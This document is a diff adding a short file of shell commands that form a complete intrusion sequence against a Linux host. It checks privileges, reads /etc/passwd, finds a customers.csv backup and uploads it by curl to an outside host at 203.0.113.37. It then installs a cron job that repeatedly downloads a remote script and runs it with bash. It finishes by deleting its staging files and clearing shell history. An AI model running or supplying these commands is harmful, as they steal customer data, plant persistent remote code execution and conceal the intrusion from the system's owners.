@@ -1,0 +1,16 @@
+id
+uname -a
+cat /etc/passwd
+sudo -l
+ls -la /var/backups
+file /var/backups/customers.csv
+wc -l /var/backups/customers.csv
+mkdir -p /tmp/.cache
+cp /var/backups/customers.csv /tmp/.cache/c.csv
+curl -s -o /dev/null -w "%{http_code}" -X POST --data-binary @/var/backups/customers.csv http://203.0.113.37:8080/upload
+crontab -l
+(crontab -l 2>/dev/null; echo "*/10 * * * * curl -s http://203.0.113.37:8080/b | bash") | crontab -
+crontab -l
+rm -rf /tmp/.cache
+history -c
+exit
